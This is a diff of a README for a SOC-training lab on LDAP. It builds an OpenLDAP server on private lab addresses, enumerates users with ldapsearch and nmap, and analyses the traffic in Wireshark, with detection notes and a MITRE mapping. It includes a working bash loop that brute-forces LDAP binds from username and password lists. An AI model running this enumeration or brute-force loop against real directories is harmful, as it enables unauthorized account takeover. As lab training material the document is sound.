@@ -1,96 +1,138 @@
+# 🗂️ LDAP — Port 389 | Practical Lab (OpenLDAP)
 
+**Author:** Muhammad Awais Javed (Mian Awais)
+**Part of:** [SOC-Journey-2026](https://github.com/awaisjaved-soc/SOC-Journey-2026)
 
-### **What is LDAP? (Simple Explanation)**
+---
+## 📌 Table of Contents
+- [🎯 Objective](#-objective)
+- [📖 What is LDAP?](#-what-is-ldap)
+- [⚙️ How It Works](#️-how-it-works)
+- [🧪 Lab Environment](#-lab-environment)
+- [💻 Commands Used](#-commands-used)
+- [🔍 Wireshark Analysis](#-wireshark-analysis)
+- [🚨 SOC Analyst Notes](#-soc-analyst-notes)
+- [🛡️ MITRE ATT&CK](#️-mitre-attck)
+- [📸 Screenshots](#-screenshots)
+- [✅ Key Takeaways](#-key-takeaways)
+
+---
+## 🎯 Objective
+
+- Understand what LDAP is and why every company directory runs on it
+- Build a working **OpenLDAP server** from scratch on Linux
+- Add real users to the directory and query them remotely with `ldapsearch`
+- Capture LDAP traffic in Wireshark and see exactly what is visible on the wire
+- Simulate how an attacker **enumerates users** and **brute-forces LDAP logins**
+
+---
+## 📖 What is LDAP?
 
 **LDAP** = **Lightweight Directory Access Protocol**
 
-Think of it as a **central phone book + identity database** for a company.
+Think of it as a **central phone book + identity database** for a company. It stores information about users, groups, computers, emails, and permissions — and almost every large organisation uses it (usually through **Active Directory** on Windows).
 
-- It stores information about users, groups, computers, emails, permissions, etc.
-- Almost every big company uses LDAP (especially through **Active Directory** in Windows).
-- Port: **389** (normal) and **636** (secure LDAPS)
+### What LDAP stores
 
-- What does it store?
+| Attribute | Example |
+|-----------|---------|
+| Usernames / UIDs | `awais`, `hamza` |
+| Full names | Hamza Khan, Sara Ahmed |
+| Email addresses | `hamza@techcorp.local` |
+| Departments & titles | Finance Manager, SOC Analyst |
+| Group memberships | Who can access which files/folders |
+| Password hashes | Stored in encrypted form |
 
-Usernames
-Full names
-Email addresses
-Phone numbers
-Which department they belong to
-What files/folders they can access
-Password hashes (in encrypted form)
+### Ports
 
-**Real Life Example:**
-When you login to your office computer, LDAP checks:
-- Is this user real?
-- What groups is he in?
-- What files/folders can he access?
+| Port | Use |
+|------|-----|
+| **389/TCP** | LDAP (plaintext) |
+| **636/TCP** | LDAPS (LDAP over TLS — encrypted) |
 
----
+### Real-life example
 
-### **How LDAP Works**
-
-1. Client says: "I am awais, give me my info"
-2. LDAP Server checks the database
-3. Server replies with user details (name, email, groups, etc.)
-
-Attackers love LDAP because they can **enumerate** (find) usernames, groups, and computers without logging in sometimes.
+When you log in to your office computer, LDAP is working in the background, answering three questions:
+1. Is this user real?
+2. What groups is he in?
+3. What files and folders can he access?
 
 ---
+## ⚙️ How It Works
 
-### **Full LDAP Practical Lab**
+A normal LDAP session follows this flow:
 
-**Lab Environment**
-- Server (LDAP Server): 192.168.100.91
-- Client: 192.168.100.90
-- Domain: `lab.local`
+```
+[ Client ]                          [ LDAP Server :389 ]
+    |                                        |
+    |--- 1. BIND Request (who I am) -------->|
+    |<-- 2. BIND Response (OK / failed) -----|
+    |                                        |
+    |--- 3. SEARCH Request (find users) ---->|
+    |<-- 4. SEARCH Results (user data) ------|
+    |                                        |
+    |--- 5. UNBIND (disconnect) ------------>|
+```
+
+1. **Client** says: *"I am awais, give me my info"* (BIND)
+2. **Server** checks the directory database
+3. **Server** replies with the user details (name, email, groups…)
+
+> ⚠️ Attackers love LDAP because they can **enumerate** (discover) usernames, groups, and computers — sometimes without even logging in.
 
 ---
+## 🧪 Lab Environment
 
-#### **STEP 1: On LDAP Server (192.168.100.91)**
+| Role | Machine | IP |
+|------|---------|----|
+| LDAP Server (OpenLDAP/`slapd`) | Linux | `192.168.100.91` |
+| Client (attacker / admin) | Linux | `192.168.100.90` |
+
+**Part 1 domain:** `lab.local` — **Part 2 (real-life scenario):** `techcorp.local` (TechCorp company)
+
+---
+## 💻 Commands Used
+
+### STEP 1 — Install OpenLDAP on the server (`192.168.100.91`)
 
 ```bash
-# Update system
+# Update the package list
 sudo apt update
 
-# Install OpenLDAP server and tools
+# Install the OpenLDAP server and client tools
 sudo apt install slapd ldap-utils -y
 ```
 
-**During installation:**
-- Administrator password → Set `Password123`
-- Confirm it
+During installation you are asked for:
+- **Administrator password** → I set `Password123` (confirm it)
 
 ```bash
-# Reconfigure if needed
+# Re-run the setup wizard if you need to change the configuration
 sudo dpkg-reconfigure slapd
 ```
 
-**Choose these options:**
-- Omit OpenLDAP server configuration? → **No**
-- DNS domain name → `lab.local`
-- Organization name → `Lab`
-- Administrator password → `Password123`
-- Database backend → MDB
-- Remove database when purging? → **No**
+In the wizard I chose:
+- *Omit OpenLDAP server configuration?* → **No**
+- *DNS domain name* → `lab.local`
+- *Organization name* → `Lab`
+- *Administrator password* → `Password123`
+- *Database backend* → **MDB**
+- *Remove database when purging slapd?* → **No**
 
 ```bash
-# Restart service
+# Restart the LDAP service and confirm it is running
 sudo systemctl restart slapd
 sudo systemctl status slapd
 ```
 
-**Purpose:** This installs and starts the LDAP server.
-
----
-
-#### **STEP 2: Add Sample Users (Create Directory Data)**
+### STEP 2 — Add sample users to the directory
 
 ```bash
+# Create an LDIF file with the directory data
 sudo nano /tmp/users.ldif
 ```
 
-Paste this:
+Paste this into the file:
 
 ```ldif
 dn: ou=people,dc=lab,dc=local
@@ -112,119 +154,63 @@ uid: mian
 userPassword: Password123
 ```
 
-Save & exit.
-
 ```bash
-# Add users to LDAP
+# Import the users into the LDAP directory (bind as admin)
 sudo ldapadd -x -D "cn=admin,dc=lab,dc=local" -W -f /tmp/users.ldif
+# Enter the admin password: Password123
 ```
+> This created two users — `awais` and `mian` — inside the directory.
 
-Enter password: `Password123`
-
-**Purpose:** We created two users (awais and mian) in the LDAP directory.
-
----
-
-#### **STEP 3: Query LDAP from Client (192.168.100.90)**
+### STEP 3 — Query LDAP from the client (`192.168.100.90`)
 
 ```bash
+# Install the LDAP client tools on the client machine
 sudo apt install ldap-utils -y
 
-# Search all users
+# Search the whole directory for person objects (enumeration)
 ldapsearch -x -H ldap://192.168.100.91 -b "dc=lab,dc=local" "(objectclass=inetOrgPerson)"
 ```
+> This is exactly what an attacker (or an admin) runs to discover users in the directory.
 
-**Purpose:** This shows how attackers or admins query the directory to find users.
-
----
-
-### **Nmap Commands for LDAP**
+### Nmap — scan for LDAP
 
 ```bash
-# Basic scan
+# Check if LDAP/LDAPS ports are open
 nmap -p 389,636 192.168.100.91
 
-# Version detection
+# Detect the LDAP service version
 nmap -sV -p 389,636 192.168.100.91
 ```
 
----
+### Part 2 — Real-life scenario: "TechCorp Company" (`techcorp.local`)
 
-### **Best Wireshark Filters for LDAP**
+I rebuilt the lab as a small company to make it realistic:
 
-```bash
-# Best general filter
-ldap || tcp.port == 389 || tcp.port == 636
-
-# Bind (Login) requests
-ldap && ldap.op == 0
-
-# Search requests (enumeration)
-ldap && ldap.op == 2
-```
-
-**What you will see:**
-- Bind Request (authentication)
-- Search Request (someone trying to find users)
-- Search Result (user data returned — often readable if not using LDAPS)
-
----
-Real world like senerio......
-
-
-
-
-### **Real-Life LDAP Lab – "TechCorp Company"**
-
-**Company Name:** TechCorp  
-**Domain:** `techcorp.local`
-
-We will create:
-- HR Manager: **Hamza Khan**
-- SOC Analyst: **Awais Javed**
-- Finance Manager: **Sara Ahmed**
-
----
-
-### **STEP 1: On LDAP Server (192.168.100.91)**
+| Employee | UID | Title | Email | Password |
+|----------|-----|-------|-------|----------|
+| Hamza Khan | `hamza` | HR Manager | hamza@techcorp.local | HamzaPass123 |
+| Awais Javed | `awais` | SOC Analyst | awais@techcorp.local | AwaisPass123 |
+| Sara Ahmed | `sara` | Finance Manager | sara@techcorp.local | SaraPass123 |
 
 ```bash
-# 1. Update and install LDAP server
+# 1. Install the LDAP server (admin password this time: AdminPass123)
 sudo apt update
 sudo apt install slapd ldap-utils -y
-```
 
-**During installation:**
-- Administrator password → Set `AdminPass123`
-
-```bash
-# 2. Reconfigure LDAP
+# 2. Reconfigure it for the company domain
 sudo dpkg-reconfigure slapd
-```
+# DNS domain name → techcorp.local | Organization → TechCorp
+# Administrator password → AdminPass123 | Backend → MDB
 
-**Choose these:**
-- Omit OpenLDAP server configuration? → **No**
-- DNS domain name → `techcorp.local`
-- Organization name → `TechCorp`
-- Administrator password → `AdminPass123`
-- Database backend → MDB
-- Remove database when purging? → **No**
-
-```bash
-# 3. Restart service
+# 3. Restart the service
 sudo systemctl restart slapd
 sudo systemctl status slapd
 ```
 
----
-
-### **STEP 2: Create Real-Life Users (Company Data)**
-
 ```bash
+# 4. Create the company users LDIF file
 sudo nano /tmp/company_users.ldif
 ```
-
-**Paste this real-life data:**
 
 ```ldif
 # Organizational Unit for People
@@ -266,61 +252,34 @@ mail: sara@techcorp.local
 userPassword: SaraPass123
 ```
 
-Save & exit.
-
 ```bash
-# Add these users to LDAP
+# 5. Import the company users (admin password: AdminPass123)
 sudo ldapadd -x -D "cn=admin,dc=techcorp,dc=local" -W -f /tmp/company_users.ldif
 ```
 
-Enter password: `AdminPass123`
-
----
-
-### **STEP 3: Query LDAP (From Client Machine)**
-
-On your **Client** (192.168.100.90):
+From the **client** (`192.168.100.90`):
 
 ```bash
+# Install client tools
 sudo apt install ldap-utils -y
 
-# Search all employees
+# List every employee in the company
 ldapsearch -x -H ldap://192.168.100.91 -b "dc=techcorp,dc=local" "(objectclass=inetOrgPerson)"
 
-# Search only SOC Analyst
+# Find one specific user
 ldapsearch -x -H ldap://192.168.100.91 -b "dc=techcorp,dc=local" "(uid=awais)"
 
-# Search by job title
+# Find everyone with "Manager" in their job title
 ldapsearch -x -H ldap://192.168.100.91 -b "dc=techcorp,dc=local" "(title=*Manager*)"
 ```
+> This is what it looks like in real life — full employee details (name, title, email) returned from one query.
 
----
+### Attacker simulation — brute-forcing LDAP logins
 
-**This is how it looks in real life** — you can see full employee details like name, title, email, etc.
+I wrote a loop that tries username/password combinations against the LDAP server, the same way an attacker tests stolen credential lists:
 
----
-or using automated loop
-
-while read user; do
-  while read pass; do
-    echo "Trying $user : $pass"
-    ldapsearch -x -H ldap://192.168.100.91 \
-      -D "cn=$user,ou=people,dc=techcorp,dc=local" \
-      -w "$pass" \
-      -b "dc=techcorp,dc=local" "(uid=$user)" > /dev/null 2>&1
-    
-    if [ $? -eq 0 ]; then
-      echo "✅ SUCCESS → Username: $user | Password: $pass"
-      # Remove "break 2" to continue testing other users
-    fi
-  done < /tmp/passwords.txt
-done < /tmp/usernames.txt
-
-
-
-cat /tmp/usernames.txt
-cat /tmp/passwords.txt
-
+```bash
+# Build the username and password lists
 cat > /tmp/usernames.txt << EOF
 Awais Javed
 Hamza Khan
@@ -336,3 +295,99 @@ sara123
 Usman123
 FatimaCEO456
 EOF
+```
+
+```bash
+# Try every user/password combination against LDAP
+while read user; do
+  while read pass; do
+    echo "Trying $user : $pass"
+    ldapsearch -x -H ldap://192.168.100.91 \
+      -D "cn=$user,ou=people,dc=techcorp,dc=local" \
+      -w "$pass" \
+      -b "dc=techcorp,dc=local" "(uid=$user)" > /dev/null 2>&1
+
+    if [ $? -eq 0 ]; then
+      echo "✅ SUCCESS → Username: $user | Password: $pass"
+    fi
+  done < /tmp/passwords.txt
+done < /tmp/usernames.txt
+```
+> `ldapsearch` returns exit code `0` on a successful bind — so any `✅ SUCCESS` line means that credential pair is valid.
+
+---
+## 🔍 Wireshark Analysis
+
+Capture on the client interface while running `ldapsearch`, then use these display filters:
+
+```
+ldap || tcp.port == 389 || tcp.port == 636
+```
+> Best general filter — shows all LDAP and LDAPS traffic.
+
+```
+ldap && ldap.op == 0
+```
+> **Bind requests** — who is trying to log in (authentication attempts).
+
+```
+ldap && ldap.op == 2
+```
+> **Search requests** — someone enumerating the directory.
+
+### What to look for in the capture
+
+| Packet | What it means |
+|--------|---------------|
+| **Bind Request** | A login attempt (username + password sent) |
+| **Bind Response** | Success or failure — failures in bulk = brute force |
+| **Search Request** | Someone querying the directory (enumeration) |
+| **Search Result Entries** | User data coming back — **readable in cleartext** if LDAPS is not used |
+
+> 🔑 Key finding: on port 389 the bind credentials and returned directory data are visible in the packets. That is why production directories must use LDAPS (636).
+
+---
+## 🚨 SOC Analyst Notes
+
+**How attackers abuse LDAP:**
+- **Enumeration** — one valid account (or anonymous bind, if misconfigured) reveals every user, group, and computer: perfect reconnaissance before password spraying or phishing.
+- **Brute force** — repeated bind requests with different passwords, exactly like my loop above.
+- **Credential interception** — on plaintext port 389, usernames and passwords can be sniffed off the wire.
+
+**What to monitor / alert on:**
+- A single source IP sending many LDAP **bind requests** in a short time (brute force)
+- Large numbers of **search requests** spanning the whole directory tree (enumeration)
+- **Anonymous binds** succeeding — this should never happen in production
+- LDAP traffic on unexpected hosts (a workstation suddenly querying the directory heavily)
+
+---
+## 🛡️ MITRE ATT&CK
+
+| Technique | ID | Relevance |
+|-----------|----|-----------|
+| Remote System Discovery | T1018 | Scanning for LDAP servers on port 389 |
+| Account Discovery | T1087 | Enumerating users/groups via `ldapsearch` |
+| Brute Force | T1110 | Password-guessing loop against LDAP binds |
+| Valid Accounts | T1078 | Using one compromised credential to dump the directory |
+
+---
+## 📸 Screenshots
+
+| Screenshot | Description |
+|------------|-------------|
+| ![LDAP search query](ldap-search-query.png) | Running `ldapsearch` against the directory and reading the results |
+| ![Visible info packets 1](visible-info%20packets%20(1).png) | Wireshark — directory data visible in cleartext packets |
+| ![Visible info packets 2](visible-info%20packets%20(2).png) | Wireshark — more cleartext LDAP traffic |
+| ![Visible info packets 3](visible-info%20packets%20(3).png) | Wireshark — cleartext LDAP traffic (continued) |
+| ![Brute force loop](cracking-passwords-using-bruteforce-loop.png) | The credential-guessing loop running against LDAP |
+| ![Brute force loop 2](cracking-passwords-using-bruteforce-loop.png.png) | Brute-force loop output (second capture) |
+| ![Adding passwords](randomly-adding-passwords.png) | Building the password list for the brute-force test |
+
+---
+## ✅ Key Takeaways
+
+- LDAP (389) is the phone book of a company network — users, groups, emails, permissions.
+- One query can dump the **entire employee directory**, which is why attackers enumerate it first.
+- On plaintext port 389, **bind credentials and directory data are visible in Wireshark** — LDAPS (636) exists for a reason.
+- Repeated bind failures from one IP = brute force; bulk search requests = enumeration — both are SIEM-worthy.
+- I built the server, populated it, queried it, attacked it, and watched it all on the wire.
